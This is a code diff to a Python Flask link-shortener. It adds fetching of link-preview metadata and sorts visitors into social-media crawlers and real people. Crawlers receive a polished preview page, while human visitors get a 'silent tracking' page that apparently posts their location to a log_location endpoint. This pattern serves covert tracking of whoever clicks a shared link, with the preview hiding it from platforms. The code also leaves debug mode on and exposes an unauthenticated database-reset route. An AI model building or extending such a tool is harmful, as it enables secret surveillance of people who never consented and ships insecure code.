@@ -3,6 +3,8 @@ import sqlite3
 import uuid
 import logging
 import os
+import requests
+from bs4 import BeautifulSoup  # Add this
 
 app = Flask(__name__)
 app.config['DEBUG'] = True
@@ -50,10 +52,43 @@ def init_db(force_reset=False):
     conn.commit()
     conn.close()
 
-# Initialize DB
+
 init_db(force_reset=False)
 
-# ====================== ROUTES ======================
+
+def get_meta_tags(url):
+    """Fetch title, description, image from original URL"""
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (compatible; LinkPreview/1.0)'}
+        response = requests.get(url, headers=headers, timeout=8)
+        response.raise_for_status()
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        # Get meta tags
+        title = soup.find('title')
+        title = title.get_text().strip() if title else None
+
+        og_title = soup.find('meta', property='og:title')
+        title = og_title['content'].strip() if og_title else title
+
+        description = soup.find('meta', attrs={'name': 'description'})
+        description = description['content'].strip() if description else None
+
+        og_desc = soup.find('meta', property='og:description')
+        description = og_desc['content'].strip() if og_desc else description
+
+        image = soup.find('meta', property='og:image')
+        image = image['content'].strip() if image else None
+
+        return {
+            'title': title or "Redirecting...",
+            'description': description or "Click to visit the destination",
+            'image': image
+        }
+    except:
+        return {'title': "Redirecting...", 'description': "Click to visit the destination", 'image': None}
+
 
 @app.route('/')
 def home():
@@ -102,23 +137,26 @@ def track(short_code):
 
     original_url = result[0]
 
-    # Bot / crawler detection for social media previews
     user_agent = request.headers.get('User-Agent', '').lower()
     is_bot = any(bot in user_agent for bot in [
         'bot', 'crawler', 'spider', 'facebookexternalhit', 'twitterbot',
         'whatsapp', 'telegrambot', 'discordbot', 'linkedinbot', 
-        'skypeuripreview', 'preview'
+        'skypeuripreview', 'preview', 'instagram'
     ])
 
     if is_bot:
-        # Show preview for social media / link unfurl
+        meta = get_meta_tags(original_url)
         return render_template('preview.html', 
-                             original_url=original_url,
-                             short_code=short_code)
+                               original_url=original_url,
+                               short_code=short_code,
+                               title=meta['title'],
+                               description=meta['description'],
+                               image=meta['image'])
     else:
-        # Normal user - silent tracking
         return render_template('track.html', short_code=short_code)
 
+
+# ... [rest of your routes remain the same] ...
 
 @app.route('/api/track/<short_code>', methods=['POST'])
 def log_location(short_code):
@@ -189,7 +227,6 @@ def get_logs(short_code):
     } for row in logs])
 
 
-# Admin Route - Reset Database
 @app.route('/admin/reset-db')
 def reset_database():
     init_db(force_reset=True)
